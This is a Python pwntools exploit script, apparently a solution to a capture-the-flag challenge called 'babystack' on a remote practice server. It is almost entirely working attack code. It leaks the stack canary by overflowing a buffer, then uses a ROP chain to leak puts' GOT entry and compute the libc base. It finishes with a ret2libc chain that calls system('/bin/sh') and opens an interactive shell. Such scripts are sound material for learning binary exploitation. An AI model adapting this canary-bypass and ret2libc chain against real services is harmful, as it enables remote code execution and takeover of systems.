from pwn import *

context.log_level = 'debug'

#p = process('./babystack')
p = remote('node4.buuoj.cn', 27341)
elf = ELF('babystack')

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = 0x400908

#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')

pop_rdi_ret = 0x400a93
ret = 0x40067e

#libc canary
payload = b'a' * ( 0x88 + 1 )

p.sendlineafter(b'>> ', b'1')
p.send(payload)

#gdb.attach(p, 'b *0x4009ee')
p.sendlineafter(b'>> ', b'2')
#pause()

p.recv(0x89)
canary = u64(p.recv(7).rjust(8, b'\0'))

print('canary -> {}'.format(hex(canary)))

#gdb.attach(p, 'b *0x4009f0')
#leak libc
payload = b'a' * 0x88 + p64(canary) + p64(0) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)

p.sendlineafter(b'>> ', b'1')
p.send(payload)

p.sendlineafter(b'>> ', b'3')

libc_base = u64(p.recv(6).ljust(8, b'\0')) - libc.sym['puts']

print('libc_base -> {}'.format(hex(libc_base)))

#ret2libc
system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'a' * 0x88 + p64(canary) + p64(0) + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)

p.sendlineafter(b'>> ', b'1')
p.send(payload)
#gdb.attach(p, 'b *0x400a2a')
p.sendlineafter(b'>> ', b'3')

p.interactive()
